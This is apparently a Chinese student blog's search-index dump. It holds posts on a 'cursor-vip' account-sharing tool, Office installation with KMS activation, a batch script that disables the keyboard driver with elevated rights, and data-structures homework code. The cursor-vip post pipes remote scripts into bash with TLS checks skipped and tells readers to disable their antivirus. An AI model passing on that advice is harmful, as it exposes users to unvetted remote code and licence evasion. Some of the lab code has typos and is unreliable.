Request\n\n至此，你已经成功创建了一个 Pull Request，等待仓库所有者检查代码并合并即可\n\n"},{"title":"如何免费使用cursor的vip账户 白嫖cursor Pro","url":"/posts/f63a776d.html","content":"cursor-vip⚠️ 如果您的地区支持官方 cursor 支付，在您资金允许的情况下,请支持官方购买，cursor 是一个不错的编辑器。\n⚠️ 本项目仅为了支付不方便的地区提供一个解决方案，目前每 8 个设备共享一个 Pro 账号，Pro 账号都是我们花钱购买的，不要滥用，谢谢！\n⚠️ 使用本项目所产生花费及收益比与官方一样，本项目没有更便宜，只是因为 8 个人分摊了，所以感觉花费更少。但是稳定性和速度都不如官方。\n⚠️ 目前代理模式的稳定性要比普通模式好，如果在代理模式中提示资源用完，请新开个会话。\n⚠️ 我们后期计划与 cursor 官方合作，为能够促进世界文明进步的项目提供支持。\n使用方式在 MacOS&#x2F;Linux 中，请打开终端；在 Windows 中，请打开 Git Bash。然后执行以下命令来安装：\n\n部分电脑可能会误报毒，需要关闭杀毒软件&#x2F;电脑管家&#x2F;安全防护再进行\n\n方式 1：通过 Gitee 脚本\nbash &lt;(curl -Lk https://gitee.com/kingparks/cursor-vip/releases/download/latest/ic.sh)  cba72d190dfd4dbcad2a78a54033fcb9\n\n方式 2：通过 GitHub 脚本\nbash &lt;(curl -Lk https://github.com/kingparks/cursor-vip/releases/download/latest/i.sh)  cba72d190dfd4dbcad2a78a54033fcb9\n\n享受 cursor-vip：\n\n打开 CURSOR 代码编辑器，点击右上角设置图标，可看到已是 VIP 账号。\n尽情享受代码提示和聊天功能。\n\n\n","categories":["cursor"],"tags":["cursor"]},{"title":"如何安装Microsoft office各种版本以及破解||office盗版弹窗的关闭方法","url":"/posts/9b07533a.html","content":"\n这篇文章需要重写，有空再改改\n\n想必大家都认识 Microsoft office\n就是常说的 Word Excel PPT 三大办公套件\n当然也有 Outlook OneNote Publisher Access Teams 等这些不常用的\n但是，正版购买要七百多甚至一千多！太贵了怎么办\n没事\n教你不花钱免费用\n前期准备原地址：[新手必读] Office Tool Plus 入门教程\n写在开头Office Tool Plus 是一个强大且实用的 Office 部署工具。\nOffice Tool Plus 基于 Office 部署工具 制作，可以很方便的部署 Office，其内置迅雷和 Downloader 引擎可帮助您更快地下载 Office。\n你也可以使用 Office Tool Plus 的其他功能或者是内置的小工具方便、快捷地管理 Office 哦！\n支持下列产品：\n\nMicrosoft 365\nOffice 2016 - 2021\nVisio Online Plan 2 &amp; Visio 2016 - 2021\nProject Online Desktop Client &amp; Project 2016 - 2021\n\n个人主页：https://officetool.plus/\n官方网站：https://otp.landian.vip/\n帮助文档：https://otp.landian.vip/help/\nGitHub：https://github.com/YerongAI/Office-Tool\n无论你是个体还是团队，Office Tool Plus 都是你的得力小助手。\n系统要求请查看帮助文档。\n相关教程点击阅读以下教程[安装 Office] Office Tool Plus 入门教程\n[激活 Office] Office Tool Plus 入门教程\n[疑难解答] Office Tool Plus 入门教程\n[技能扩展] Office Tool Plus 高级教程\n主要功能\n创建 Office 安装配置，支持导出到本地；或从本地或网络位置导入。\n下载 Office，支持所有通道的 Office，支持所有的 Office 语言。\n安装 Office，支持对现有的 Office 进行修改，包括新增或卸载产品和应用程序。[1]\n创建 Office ISO，支持默认安装配置、静默安装配置。\n支持 Office 激活管理，包括许可证管理，密钥管理以及 KMS 管理。[2]\n激活 Office，支持在线激活、电话激活、KMS 激活。[3]\n修改 Office 更新通道，支持在不重装 Office 的情况下升级&#x2F;降级 Office.\n移除 Office，在 Office 无法正常卸载的情况下强制移除 Office，几乎支持所有 Office 版本。\n内置 Office 工具箱，可以修复安装或使用 Office 过程中遇到的大多数问题。\n转换 Office 文档，基于 Office COM，稳定可靠。\n自定义主题，打造你自己的专属 Office Tool Plus。\n\n还有更多功能，等待您的体验~\n注[1]：能够安装的 Office 版本视 Windows 版本决定。注[2]：安装许可证时，旧的许可证不会被清除，因此零售和批量许可证可以共存。注[3]：无论你如何激活 Office 都需要自行处理，Office Tool Plus 不会也不可能提供任何破解途径。\n\nOffice Tool Plus 合法吗？Office Tool Plus 是一款完全合法的应用程序，提供的是原版 Office，不对 Office 的任何东西进行未经授权的修改。我们给用户提供了 Office 的下载、安装、激活功能，具体 Office 正版与否，取决于用户如何激活 Office。\nOffice 是支持账户、密钥、KMS 激活的，前两者基本都是正版授权（网上找的密钥另说），KMS 的正版和非正版因为人们多少都有点误解，因此在这里补充解释一下。\n什么是 KMS？具体的技术性资料可从网上搜索得到，这里就简单粗暴地描述一下。\n\nKMS 激活类似于签名一样，在大多数现实情况下，签名可以仿写，就像是“家长签名”一样，很多时候其实不是真的家长签名吧 \n那么你把这份“经过家长签名”的东西给了老师或者领导，他们大多数时候也不会去验证是吧？\nKMS 激活也是有正规的，正规的来讲就是要经过微软授权的（就比如签名一定得是家长本人签的）。\n但 KMS 也可以像“家长签名”一样伪造，就是 Office 接收到了来自 KMS 主机返回的激活信息，它不知道这个信息是不是正版授权的，总之接收到了正确的信息然后就这么简单地就激活了。\n一句话讲晒，就是冒名顶替，没人查确实不知道，一查出来你就 gg\n\n这就是 Office 与 KMS 的关系，简单来讲就是这样。再补充一下：\n每隔 7 天（默认），Office 都会与 KMS 通信一次，以更新自己的许可证状态。\n如果 KMS 允许你更新许可，那么新的许可就是 180 天期限。\n如果 KMS 不允许你更新许可，或者 KMS 不可用，那么原来的 180 天期限到期后，你的 Office 就会变成未激活了。\nKMS 正版与否的区别有微软授权的 KMS 服务器一般情况下只能部署在 Windows Server 上，且通常只在内网部署，不对外开放。\n目前网上公开的基本都是基于 vlmcs 的 KMS 服务器，非正版，无激活限制，谁都可以访问。\noffice 提示你的许可证不是正版，你可能是盗版软件的受害者？看这个\noffice 提示你的许可证不是正版，你可能是盗版软件的受害者？\n","categories":["技术教程","Windows"],"tags":["Windows","office"]},{"title":"如何暂时禁用笔记本自带键盘(附恢复方法)","url":"/posts/1675f255.html","content":"如何暂时禁用笔记本自带键盘(附恢复方法)问题背景在我们日常码字中，使用外置机械键盘是很爽的体验，有时候空间较小时我们不得不把键盘摞在笔记本键盘上面，但是由于容易误触，容易按到笔记本键盘按键，这是十分影响体验的\n其实可以使用 Windows 批处理来暂时禁用键盘，等到再用的时候再打开\n本教程  不需要搭建环境，开袋即食 （除非不是 Windows 系统）\n脚本准备禁用脚本首先新建一个txt文件，命名为 一键禁用笔记本键盘.txt\n然后打开进行编辑，把下面代码复制进去\n@echo offecho 提示：计算机将要重启，请保存您的工作！pause@cd/d&quot;%~dp0&quot;&amp;(cacls &quot;%SystemDrive%\\System Volume Information&quot; &gt;nul 2&gt;nul)||(start &quot;&quot; mshta vbscript:CreateObject^(&quot;Shell.Application&quot;^).ShellExecute^(&quot;%~nx0&quot;,&quot; %*&quot;,&quot;&quot;,&quot;runas&quot;,1^)^(window.close^)&amp;exit /b)sc config i8042prt start= disabledshutdown -r -t 0\n\n保存之后，修改文件后缀为 bat\n然后按键盘 Ctrl+shift+s，下方编码选择ANSI\n\n保存之后，就可以用了\n注意：此操作需要重启电脑，请保存好重要文件之后再继续执行，脚本中也内置了提示性语句。确保文件安全\n启用脚本下面介绍启用脚本代码，要求与上面完全相同，除了代码不同，但也类似\n@echo offecho 提示：计算机将要重启，请保存您的工作！pause@cd/d&quot;%~dp0&quot;&amp;(cacls &quot;%SystemDrive%\\System Volume Information&quot; &gt;nul 2&gt;nul)||(start &quot;&quot; mshta vbscript:CreateObject^(&quot;Shell.Application&quot;^).ShellExecute^(&quot;%~nx0&quot;,&quot; %*&quot;,&quot;&quot;,&quot;runas&quot;,1^)^(window.close^)&amp;exit /b)sc config i8042prt start= autoshutdown -r -t 0\n\n使用演示\n内置了提示语句，如果打开之后后悔了，直接点击右上角退出即可\n","categories":["技术教程","Windows"],"tags":["Windows","键盘控制","bat批处理"]},{"title":"子数整数","url":"/posts/7f4b2896.html","content":"子数整数题目描述对于一个五位数 $\\overline{a_1a_2a_3a_4a_5}$，可将其拆分为三个子数：\n$sub_1&#x3D;\\overline{a_1a_2a_3}$\n$sub_2&#x3D;\\overline{a_2a_3a_4}$\n$sub_3&#x3D;\\overline{a_3a_4a_5}$\n例如，五位数 $20207$ 可以拆分成\n$sub_1&#x3D;202$\n$sub_2&#x3D;020\\ (&#x3D;20)$\n$sub_3&#x3D;207$\n现在给定一个正整数 $K$，要求你编程求出 $10000$ 到 $30000$ 之间所有满足下述条件的五位数，条件是这些五位数的三个子数 $sub_1,sub_2,sub_3$ 都可被 $K$ 整除。\n输入格式一个正整数 $K$。\n输出格式每一行为一个满足条件的五位数，要求从小到大输出。不得重复输出或遗漏。如果无解，则输出 No。\n样例 #1样例输入 #115\n\n样例输出 #122555255552855530000\n\n提示$0&lt;K&lt;1000$\n题解k = int(input())count = 0for i in range(10000, 30001):    w = i // 10000    q = (i - 10000 * w) // 1000    b = (i - 10000 * w - 1000 * q) // 100    s = (i - 10000 * w - 1000 * q - 100 * b) // 10    g = i - 10000 * w - 1000 * q - 100 * b - 10 * s    sub1 = 100 * w + 10 * q + 1 * b    sub2 = 100 * q + 10 * b + 1 * s    sub3 = 100 * b + 10 * s + 1 * g    if (sub1 % k == 0) and (sub2 % k == 0) and (sub3 % k == 0):        print(i, end=&quot;\\n&quot;)        count = 1if count == 0:    print(&quot;No&quot;)\n\n代码其实还可以优化，把 qbsg 的计算方法改一下\nq = (i % 10000) // 1000b = (i % 1000) // 100s = (i % 100) // 10g = i % 10\n\n\n\n题解解释\n来自 ChatGPT\n\n这段代码的作用是寻找在范围 [10000, 30000] 内的所有满足特定条件的五位数。根据题目描述，这些五位数可以被拆分为三个子数 sub1, sub2, sub3，而且这三个子数都能被输入的整数 K 整除。\n代码首先通过 input() 函数获取用户输入的整数 K。然后通过一个循环遍历范围 [10000, 30000] 内的所有五位数。\n在循环中，通过整数除法 // 和取余 % 运算符计算了每个五位数的各位数字。这些数字被用于构造三个子数 sub1, sub2, sub3。\n接下来，检查每个五位数的三个子数是否都能被 K 整除。如果满足条件，则打印该五位数，并将计数器 count 设为 1，以表示至少有一个五位数满足条件。\n循环结束后，检查 count 的值。如果 count 仍然为 0，则说明没有找到满足条件的五位数，输出 “No”。\n知识点这题不难，就是取余取整\n 注意 input 要转成 int 型 \n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"如何经营好个人博客","url":"/posts/d38d49dd.html","content":"\nhttps://tumutanzi.com/archives/12924#/\n\n不要常换网站域名不是.com域名？换？域名太长？换？被墙了？换？换来换去，依然不知道自己的域名应该是什么样，搜索引擎不知道，读者也不知道。域名永远是新的。月光博客的域名 williamlong.info 怎么样？我依然记得住，或者根本不用记。就像一个常换手机号的人，你觉得靠谱吗？招牌字号经常换，还能叫“百年老字号”？\n不要追求VPS主机个人独立博客是个独立网站，需要建立在主机服务器上。建在虚拟主机上还是VPS上？一般的博客完全不必放在VPS上。服务器的安全维护和优化，需要理论技术，还需要花费大量的时间和精力。选择一个好的虚拟主机，把这些事情交给技术人员，会做得更好。\n我们最多明白汽车怎么生产就够了，实在感兴趣，可以买一些成型的零件组装一下，但完全不必要买来车床和一堆钢材，自己生产零件，然后再组装成汽车。那样的话，你应该直接去汽车厂。对于博客主机也是一样的道理。除非你特别喜欢折腾服务器，或者是IT从业人员。\n不要纠结博客程序静态博客程序还是动态博客程序？简单的功能还是复杂的功能？是否支持Markdown？能不能命令行写作？严格意义上来说，无论静态还是动态，两者皆可互换。大众化的WordPress成熟一条龙解决方案有什么不好？广告、评论管理，可简单可复杂，没有什么功能不能实现，就算迁移也无障碍。\n很多IT高手们“喜欢”用静态博客生成器建立博客，号称Markdown语法爽翻天，其实博客上就那么几篇日志，记录一下自己搭建的过程，然后就再也没了。居然还问：程序员博客方案哪家强？Ghost，Jekyll，Github Pages，Hexo，弄来弄去都是折腾。事实上，建立一个好博客，不需要那么多功能。\n不要折腾博客外观内容最重要，外观不是那么重要，简洁就好，又快又突出重点内容。折腾过去折腾过来的换皮，其实也只有博主自己最重视这张皮。忠实的读者也许使用RSS订阅，根本看不到你折腾的主题外观。没有好的内容，再酷的外观都是渣，有好的内容，就是白纸黑字的界面也是赞。\n不要盯着广告收入博客早期流量一般不高，自然也不会有看得见的广告收入。虽然早期也可以投放，但不要期望有可观的收入。有了每天1,000个访客以后，广告收入自然会上来。死死地盯着广告收入，不但得不到，反而耽误写作好的内容。何况，博客的意义与收获又岂止这点广告收入？\n不要限制写作话题什么都可以写，博主是个活生生的人，每个人都是多方面的，在博客里记录自己的故事就好。你不可能只懂一方面，如果你只钻研某一方面，总会有一天写得想吐，你的读者也会看得想吐。你本身的复杂多样可以让博客也丰富多彩。\n不要担心写作技巧在能写好博客之前永远是写不好。只有写了，才会发现越来越容易写。关于写作手法，博客不是作文，不是公务员考试中的申论。其实，真实的思想表述不需要太多的技巧。\n你若是一个严肃的人，想方设法抖出来机灵一点都不搞笑。你是什么样的人，就用什么样的语言，把事情和意思准确、干净地表达出来，这就是写作最基本也是最重要的要求。\n内容与坚持是王道换域名，换空间，换程序，换主题，SEO推广，清除博客，重新再来，最终不再博客，只得一声叹息：原来我也博客过。大多数人在折腾怎么搭博客，很少有人坚持写博客，坚持创造好的内容。\n创建一个好Blog，当好一名Blogger，只有坚持创作好的内容才是王道。为什么要经营好自己的博客？无论互联网怎么变，独立个人博客是真正属于你自己的网络空间，博客久了，自会明白。\n","categories":["博客"],"tags":["博客"]},{"title":"实验一、顺序存储结构线性表的建立及操作","url":"/posts/767f4a40.html","content":"\n声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬\n\n\n代码主体#include &lt;iostream&gt;using namespace std;struct Student &#123;    long num;    char name[10];    float score;&#125;;class ScoreList &#123;private:    Student data[100];    int length;public:    ScoreList() &#123;        length = 5;        data[0] = &#123; 1001, &quot;张三&quot;, 85 &#125;;        data[1] = &#123; 1002, &quot;李四&quot;, 90 &#125;;        data[2] = &#123; 1003, &quot;王五&quot;, 80 &#125;;        data[3] = &#123; 1004, &quot;赵六&quot;, 95 &#125;;        data[4] = &#123; 1005, &quot;孙七&quot;, 88 &#125;;    &#125;    void del(long num) &#123;        for (int i = 0; i &lt; length; i++) &#123;            if (data[i].num == num) &#123;                for (int j = i; j &lt; length - 1; j++) &#123;                    data[j] = data[j + 1];                &#125;                length--;                break;            &#125;        &#125;    &#125;        void insert(Student stu) &#123;        int pos = 0;        while (pos &lt; length &amp;&amp; data[pos].score &gt; stu.score) pos++;        for (int i = length; i &gt; pos; i--) &#123;            data[i] = data[i - 1];        &#125;        data[pos] = stu;        length++;    &#125;        void output() &#123;        cout &lt;&lt; &quot;学号\\t姓名\\t分数&quot; &lt;&lt; endl;        for (int i = 0; i &lt; length; i++) &#123;            cout &lt;&lt; data[i].num &lt;&lt; &quot;\\t&quot; &lt;&lt; data[i].name &lt;&lt; &quot;\\t&quot; &lt;&lt; data[i].score &lt;&lt; endl;        &#125;    &#125;&#125;;int main() &#123;    long a;    char b[10];    float c;    ScoreList list;    list.output();    cout &lt;&lt; &quot;删除一个学生，请输入学生学号&quot; &lt;&lt; endl;    cin &gt;&gt; a;    list.del(a);    list.output();    cout &lt;&lt; &quot;插入一个新学生（学号 姓名 分数 ）用空格隔开&quot; &lt;&lt; endl;    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;    Student newStu = &#123; a, &quot;&quot;, c &#125;;    strcpy_s(newStu.name, b); // 使用 strcpy 函数复制字符串    list.insert(newStu);    list.output();    return 0;&#125;\n\n","categories":["学习笔记","数据结构作业","实验"],"tags":["数据结构作业"]},{"title":"实验七 最小生成树和最短路径的实现","url":"/posts/1b9cb669.html","content":"\nPrim算法\n没听课（）教材代码，复制过来了\n\n/*******************************    对应教材6.4.1节，Prim算法 ********************************/#include &lt;iostream&gt;using namespace std;const int MaxSize = 10;                   //图中最多顶点个数int visited[MaxSize] = &#123;0&#125;;              //全局数组变量visited初始化template &lt;class DataType&gt;class MGraph&#123;public:   \tMGraph(DataType a[ ], int n, int e);     //构造函数，建立具有n个顶点e条边的图   \t~MGraph( )&#123; &#125;;                        //析构函数 \tvoid Prim(int v);private:    DataType vertex[MaxSize];           //存放图中顶点的数组    int edge[MaxSize][MaxSize];           //存放图中边的数组    int vertexNum, edgeNum;              //图的顶点数和边数 \tint MinEdge(int r[ ], int n);&#125;;  template &lt;class DataType&gt;MGraph&lt;DataType&gt; :: MGraph(DataType a[ ], int n, int e) &#123;   \tint i, j, k, w;   \tvertexNum = n; edgeNum = e;   \tfor (i = 0; i &lt; vertexNum; i++)          //存储顶点   \t\tvertex[i] = a[i];   \tfor (i = 0; i &lt; vertexNum; i++)          //初始化邻接矩阵 \t\tfor (j = 0; j &lt; vertexNum; j++)   \t\t\tif (i == j)\t\t\t   edge[i][j] = 0;\t\t\telse\t\t\t   edge[i][j] = 100;               //假设边上权的最大值是100                \tfor (k = 0; k &lt; edgeNum; k++)           //依次输入每一条边   \t&#123;   \t\tcout &lt;&lt; &quot;请输入边依附的两个顶点的编号，以及边上的权值：&quot;;\t\tcin &gt;&gt; i &gt;&gt; j &gt;&gt; w;                       //输入边依附的两个顶点的编号\t\tedge[i][j] = w; edge[j][i] = w;           //置有边标志   \t&#125;&#125;template &lt;class DataType&gt;void MGraph&lt;DataType&gt; :: Prim(int v)                           //从顶点v出发&#123;   \tint i, j, k;\tint adjvex[MaxSize], lowcost[MaxSize];    for (i = 0; i &lt; vertexNum; i++)             //初始化辅助数组\t&#123;\t\tlowcost[i] = edge[v][i]; adjvex[i] = v;\t&#125;\tlowcost[v] = 0;                         //将顶点v加入集合U\tfor (k = 1; k &lt; vertexNum; k++)            //迭代n-1次\t&#123;\t\tj = MinEdge(lowcost, vertexNum);       //寻找最短边的邻接点j      \tcout &lt;&lt; &quot;(&quot; &lt;&lt; vertex[j] &lt;&lt; &quot;,&quot; &lt;&lt; vertex[adjvex[j]] &lt;&lt; &quot;)&quot; &lt;&lt; lowcost[j] &lt;&lt; endl; \t\tlowcost[j] = 0;                       //顶点j加入集合U\t\tfor (i = 0; i &lt; vertexNum; i++)          //调整辅助数组\t        if (edge[i][j] &lt; lowcost[i]) &#123;\t\t\t\tlowcost[i] = edge[i][j]; \t\t\t\tadjvex[i] = j;        \t&#125;    &#125;&#125;template &lt;class DataType&gt;int MGraph&lt;DataType&gt; :: MinEdge(int r[ ], int n)&#123;\tint index = 0, min = 100;           //此处如果仅记载最小值下标会有bug \tfor (int i = 1; i &lt; n; i++)\t\tif (r[i] != 0 &amp;&amp; r[i] &lt; min)\t\t&#123;\t\t\tmin = r[i]; index = i;\t\t\t\t&#125;\treturn index;&#125;int main( )&#123;\t/*测试数据使用教材 图6-16 所示带权无向图， 输入边依次为 \t(0 1 34)(0 2 46)(0 5 19)(1 4 12)(2 3 17)(2 5 25)(3 4 38)(3 5 25)(4 5 26) */ \tchar ch[ ]=&#123;&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;&#125;;       \tMGraph&lt;char&gt; MG&#123;ch, 6, 9&#125;;             \tMG.Prim(0);\treturn 0;&#125;\n\n","categories":["学习笔记","数据结构作业","实验"],"tags":["数据结构作业"]},{"title":"实验三、栈和队列的应用","url":"/posts/a2945f82.html","content":"\n已完结\n声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬\n\n\n实验原理\n顺序栈：顺序栈是一种基于数组实现的栈。它通过一个数组和一个栈顶指针实现。当有新元素入栈时，将新元素放在数组的末尾，并将栈顶指针向后移动一位。当需要出栈时，直接返回栈顶元素，并将栈顶指针向前移动一位。\n链式栈：链式栈是一种基于链表实现的栈。它通过一个链表和一个头节点实现。当有新元素入栈时，将新元素插入到链表的头部，并更新头节点。当需要出栈时，直接返回头节点所指向的节点，并让头节点指向下一个节点。\n循环队列：循环队列是一种特殊的队列，它在逻辑上是环形的。循环队列使用一个数组和两个指针（一个头指针和一个尾指针）来实现。当元素入队时，尾指针向前移动并添加新元素；当元素出队时，头指针向前移动。当尾指针到达数组的末尾时，它会从数组的开始继续。\n链式队列：链式队列是基于单链表实现的队列。它使用一个单链表和两个指针（一个头指针和一个尾指针）来实现。当元素入队时，新元素被添加到链表的尾部，并更新尾指针；当元素出队时，头部的元素被移除，并更新头指针\n\n实验内容和步骤\n顺序栈：\n入栈：将新元素放在数组的末尾，并将栈顶指针向后移动一位。\n出栈：返回栈顶元素，并将栈顶指针向前移动一位。\n\n\n链式栈：\n入栈：将新元素插入到链表的头部，并更新头节点。\n出栈：返回头节点所指向的节点，并让头节点指向下一个节点。\n\n\n循环队列：\n入队：尾指针向前移动并添加新元素。\n出队：头指针向前移动。当尾指针到达数组的末尾时，它会从数组的开始继续。\n\n\n链式队列：\n入队：新元素被添加到链表的尾部，并更新尾指针。\n出队：头部的元素被移除，并更新头指针。\n\n\n\n代码主体顺序栈SeqStack的实现：\n自己写的\n\n#include &lt;iostream&gt;using namespace std;const int StackSize = 100;  // 定义最大栈顶具体情况具体分析template&lt;typename DataType&gt;   //定义模板类SeqStackclass SeqStack&#123;public:\tSeqStack();   //构造函数，初始化空栈\t~SeqStack();\t//析构函数\tvoid Push(DataType x);\t//压栈\tDataType Pop();\t//出栈\tDataType GetTop();//取栈顶\tDataType TopTop();//取栈顶下标\tint empty();\t//判空操作private:\tDataType data[StackSize];\t//存放栈元素的数组\tint top;\t//栈顶元素的下标&#125;;template&lt;typename DataType&gt;SeqStack&lt;DataType&gt;::~SeqStack()&#123;&#125;template&lt;typename DataType&gt;void SeqStack&lt;DataType&gt;::Push(DataType x)&#123;\tif (top == StackSize -1 )\t&#123;\t\tcout &lt;&lt; &quot;栈满&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\ttop++;\t\tdata[top] = x;s\t&#125;&#125;template&lt;typename DataType&gt;DataType SeqStack&lt;DataType&gt;::Pop()&#123;\tif (top == -1 )\t&#123;\t\tcout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tDataType x;\t\tx = data[top];\t\ttop--;\t\treturn x;\t&#125;&#125;template&lt;typename DataType&gt;DataType SeqStack&lt;DataType&gt;::GetTop()&#123;\tif (top == -1 )\t&#123;\t\tcout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\treturn data[top];\t&#125;&#125;template&lt;typename DataType&gt;int SeqStack&lt;DataType&gt;::empty()&#123;\tif (top == -1)\t&#123;\t\treturn 1;\t&#125;\telse\t&#123;\t\treturn 0;\t&#125;&#125;template&lt;typename DataType&gt;DataType SeqStack&lt;DataType&gt;::TopTop()&#123;\treturn\ttop;&#125;template&lt;typename DataType&gt;SeqStack&lt;DataType&gt;::SeqStack()&#123;\ttop = -1;&#125;int main()&#123;\tint ws1 = 0;\tSeqStack&lt;int&gt; S&#123;&#125;;//定义顺序栈变量\tS.Push(1);\tS.Push(2);\tS.Push(3); \tcout &lt;&lt; &quot;系统已压栈1,2,3&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;输入一个元素进行压栈&quot; &lt;&lt; endl;\tcin &gt;&gt; ws1;\tS.Push(ws1);\tcout &lt;&lt; &quot;当前栈顶元素为：&quot; &lt;&lt; S.GetTop() &lt;&lt; endl;\tcout &lt;&lt; &quot;*****************&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;执行一次出栈操作&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;已释放&quot; &lt;&lt; S.Pop() &lt;&lt; endl;\tcout &lt;&lt; &quot;当前栈顶元素为：&quot; &lt;&lt; S.GetTop() &lt;&lt; endl;\tcout &lt;&lt; &quot;*****************&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;执行一次判空操作&quot; &lt;&lt; endl;\tif (S.empty() == 1)\t&#123;\t\tcout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tcout &lt;&lt; &quot;栈非空&quot; &lt;&lt; endl;\t&#125;\tcout &lt;&lt; &quot;*****************&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;正在出所有栈&quot; &lt;&lt; endl;\tfor (int i = S.TopTop(); i &gt; -1 ; i--)\t&#123;\t\tcout &lt;&lt; &quot;已释放&quot; &lt;&lt; S.Pop() &lt;&lt; endl;\t&#125;\tcout &lt;&lt; &quot;已释放出所有栈&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;*****************&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;执行一次判空操作&quot; &lt;&lt; endl;\tif (S.empty() == 1)\t&#123;\t\tcout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tcout &lt;&lt; &quot;栈非空&quot; &lt;&lt; endl;\t&#125;    return 0;&#125;\n\n链式栈LinkStack的实现：\n自己写的\n\n#include &lt;iostream&gt;using namespace std;template &lt;typename DataType&gt;struct Node&#123;    DataType data;    Node&lt;DataType&gt;* next;&#125;;template &lt;typename DataType&gt;class LinkStack&#123;public:    LinkStack();    ~LinkStack();    void Push(DataType x);  //入栈    DataType Pop();     //出栈    DataType GetTop();  //取栈顶    int Empty();        //判空private:    Node&lt;DataType&gt;* top;&#125;;template &lt;typename DataType&gt;LinkStack&lt;DataType&gt;::LinkStack()&#123;    top = nullptr;&#125;template &lt;typename DataType&gt;LinkStack&lt;DataType&gt;::~LinkStack()&#123;    cout &lt;&lt; &quot;程序退出，析构函数被调用!&quot; &lt;&lt; endl;    while (!Empty())    &#123;        cout &lt;&lt; &quot;出栈元素：&quot; &lt;&lt; Pop() &lt;&lt; endl;    &#125;    cout &lt;&lt; &quot;程序退出链栈已清空!&quot; &lt;&lt; endl;&#125;template &lt;typename DataType&gt;DataType LinkStack&lt;DataType&gt; ::GetTop()&#123;    if (top == nullptr)        cout &lt;&lt; &quot;下溢异常&quot; &lt;&lt; endl;    else        return top-&gt;data;&#125;template &lt;typename DataType&gt;void LinkStack&lt;DataType&gt; ::Push(DataType x)&#123;    Node&lt;DataType&gt;* s = nullptr;    s = new Node&lt;DataType&gt;;    s-&gt;data = x; //申请结点s数据域为x    s-&gt;next = top;    top = s; //将结点s插在栈顶&#125;template &lt;typename DataType&gt;DataType LinkStack&lt;DataType&gt; ::Pop()&#123;    Node&lt;DataType&gt;* p = nullptr;    DataType x;    if (top == nullptr)    &#123;        cout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;    &#125;    else    &#123;        x = top-&gt;data; p = top; //暂存栈顶元素        top = top-&gt;next; //将栈顶结点摘链        delete p;        return x;    &#125;&#125;template &lt;typename DataType&gt;int LinkStack&lt;DataType&gt;::Empty()&#123;    if (top == nullptr)    &#123;        return 1;    &#125;    else    &#123;        return 0;    &#125;&#125;int main()&#123;    int ws1 = 0;    LinkStack&lt;int&gt; S&#123;&#125;;//定义顺序栈变量S    S.Push(1);    S.Push(2);    S.Push(3);    cout &lt;&lt; &quot;系统已压栈1,2,3&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;输入一个元素进行压栈&quot; &lt;&lt; endl;    cin &gt;&gt; ws1;    S.Push(ws1);    cout &lt;&lt; &quot;当前栈顶元素为：&quot; &lt;&lt; S.GetTop() &lt;&lt; endl;    cout &lt;&lt; &quot;*****************&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;执行一次出栈操作&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;已释放&quot; &lt;&lt; S.Pop() &lt;&lt; endl;    cout &lt;&lt; &quot;当前栈顶元素为：&quot; &lt;&lt; S.GetTop() &lt;&lt; endl;    cout &lt;&lt; &quot;*****************&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;执行一次判空操作&quot; &lt;&lt; endl;    if (S.Empty() == 1)    &#123;        cout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;    &#125;    else    &#123;        cout &lt;&lt; &quot;栈非空&quot; &lt;&lt; endl;    &#125;    cout &lt;&lt; &quot;*****************&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;正在出所有栈&quot; &lt;&lt; endl;    while (S.Empty() != 1)    &#123;        cout &lt;&lt; &quot;已释放&quot; &lt;&lt; S.Pop() &lt;&lt; endl;    &#125;    cout &lt;&lt; &quot;已释放出所有栈&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;*****************&quot; &lt;&lt; endl;    cout &lt;&lt; &quot;执行一次判空操作&quot; &lt;&lt; endl;    if (S.Empty() == 1)    &#123;        cout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;    &#125;    else    &#123;        cout &lt;&lt; &quot;栈非空&quot; &lt;&lt; endl;    &#125;    return 0;&#125;\n\n循环队列CirQueue的实现：#include&lt;iostream&gt;using namespace std;const int QueueSize = 100; //最大长度template &lt;typename DataType&gt;class CirQueue&#123;public:\tCirQueue();\t~CirQueue();\tvoid EnQueue(DataType x);//入队\tDataType DeQueue();//出队\tDataType GetQueue();//取队头\tint Empty();//判空操作private:\tDataType data[QueueSize];//存放需要的数组\tint front, rear;//队头和队尾指针&#125;;template&lt;typename DataType&gt;CirQueue&lt;DataType&gt;::CirQueue()&#123;\trear = front = QueueSize - 1;&#125;template&lt;typename DataType&gt;CirQueue&lt;DataType&gt;::~CirQueue()&#123;&#125;template&lt;typename DataType&gt;void CirQueue&lt;DataType&gt;::EnQueue(DataType x)&#123;\tif ((rear+1)%QueueSize==front)\t&#123;\t\tcout &lt;&lt; &quot;队满&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\trear = (rear + 1) % QueueSize; //队尾指针+1\t\tdata[rear] = x;\t\t\t//在队尾插入元素\t&#125;&#125;template&lt;typename DataType&gt;DataType CirQueue&lt;DataType&gt;::DeQueue()&#123;\tif ((rear + 1)%QueueSize==front )\t&#123;\t\tcout 